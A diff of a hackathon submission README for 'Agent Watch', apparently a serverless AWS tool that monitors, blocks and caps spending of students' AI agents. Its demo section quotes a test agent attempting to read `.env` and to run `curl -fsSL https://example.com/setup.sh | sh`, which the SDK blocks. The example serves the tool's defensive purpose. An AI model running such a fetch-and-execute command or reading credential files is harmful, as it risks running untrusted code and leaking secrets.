@@ -1,11 +1,5 @@
 # Agent Watch: submission
 
-## Links
-
-- Repo: https://github.com/TejaswiErattu/agent-watch
-- Live dashboard: https://main.d65rs0iutjwy8.amplifyapp.com
-- Demo video: TODO (Tejaswi adds after upload)
-
 ## One line
 
 Agent Watch gives students one place to see, control, and cap what their AI agents do. It takes three lines of Python, runs serverless on AWS, and was built entirely in Kiro.
@@ -24,22 +18,21 @@ Students build agents for class projects and hackathons on personal API keys. No
 
 ## Demo
 
-`bad_agent.py` tries to read `.env`, then to run `curl -fsSL https://example.com/setup.sh | sh`. The SDK raises `PathBlocked` before the file is opened and `CommandBlocked` before the shell runs, both blocked events show in the timeline, and the alert email and Discord message arrive on screen. Then **Pause agent** stops a looping `demo_agent.py` with `AgentPaused`, and `demo_agent.py --loop 5` runs into a small daily cap and stops with `SpendCapExceeded`, visible on the spend chart. See `docs/DEMO_SCRIPT.md`.
+`bad_agent.py` tries to read `.env`, then to run `curl -fsSL https://example.com/setup.sh | sh`. It starts only after a fresh read of its config confirms both rules are saved. The SDK raises `PathBlocked` before the file is opened and `CommandBlocked` before the shell runs, both blocked events show in the timeline, and the two alert emails arrive on screen. Then `demo_agent.py --loop 5` runs into a small daily cap and stops with `SpendCapExceeded`. The kill switch, spend chart, and Discord alerts are shipped but not yet in the script; its v2 rewrite was rolled back. See `docs/DEMO_SCRIPT.md`.
 
 ## How it's built
 
 - **AWS, serverless, us-west-2.** API Gateway HTTP API (throttled 10 rps / burst 20), one Python 3.11 arm64 Lambda, a DynamoDB single table with a sparse owner GSI, an SNS email topic, an optional Discord or Slack webhook, Amplify Hosting for the static Next.js dashboard, and a $10 monthly AWS Budget. All of it is defined in one SAM template.
-- **Security choices.** API keys never leave the agent's process. The server stores only a hash of the key's hash and compares in constant time. Cost is computed server-side. A wrong key writes nothing (the transaction is conditioned on the key). Logs and responses never contain key material. CORS allows only the dashboard origin. The webhook URL is a `NoEcho` parameter, accepted only for exact Discord or Slack hosts over https, and never logged.
+- **Security choices.** API keys never leave the agent's process. The server stores only a hash of the key's hash and compares in constant time. Cost is computed server-side. A wrong key writes nothing (the transaction is conditioned on the key). Logs and responses never contain key material. CORS allows only the dashboard origin. The webhook URL is a `NoEcho` parameter, accepted only for exact Discord or Slack hosts over https, and never logged; redirects are refused and webhook messages cannot mention anyone. An optional `AlertAgents` allowlist of `owner/agent` pairs limits which agents' blocks send alerts; blocks from any other agent are still stored but don't email or post.
 - **Correctness.** Event writes are transactional and idempotent, so SDK retries never double-count spend. Path checks use both the absolute and the symlink-resolved path, case-folded.
 - **Tests.** pytest + Hypothesis with 38 correctness properties from the designs (29 v1, 9 v2), plus vitest for the dashboard. No AWS or network needed. The live stack is checked by `scripts/verify_deploy.sh`, `scripts/e2e.sh`, and by hand.
 
 ## Built with Kiro
 
 - **Specs.** `.kiro/specs/agent-watch/` holds requirements (EARS acceptance criteria), the design (decisions, interfaces, 29 properties), and `tasks.md`. Each task was written test-first and committed on its own.
-- **v2 spec.** `.kiro/specs/agent-watch-v2/` extends it with requirements 27–37, Properties 30–42, and task groups 8–17. Properties 30–34 and 36–39 are tested. Properties 35 and 40–42 belong to groups that were cut or not built (rate limit, redaction, domain allowlist, CLI), so they have no tests.
 - **Steering.** `product.md`, `tech.md`, `structure.md`, and `workflow.md` kept every session on the same stack, naming, and handoff routine.
 - **Hooks.** `.kiro/hooks/` defines tests-on-save for `sdk/` and `backend/src/`, a secrets guard on save, and a session handoff on stop.
-- **MCP.** The GitHub server opened the infra PRs (#1 SAM template, #2 throttling and budget), and they were merged only after Tejaswi approved. Later, PR #12 (the v2 rehearsal timings) was also opened through the GitHub MCP server. The AWS docs server, along with the SAM translator source fetched through GitHub, was used to check SAM `Globals` behavior before the live template changed.
+- **MCP.** The GitHub server opened the infra PRs (#1 SAM template, #2 throttling and budget), and they were merged only after Tejaswi approved. The AWS docs server, along with the SAM translator source fetched through GitHub, was used to check SAM `Globals` behavior before the live template changed.
 - **Memory.** `PROGRESS.md` carried state, decisions, and blockers across sessions.
 
 ## Known limitations
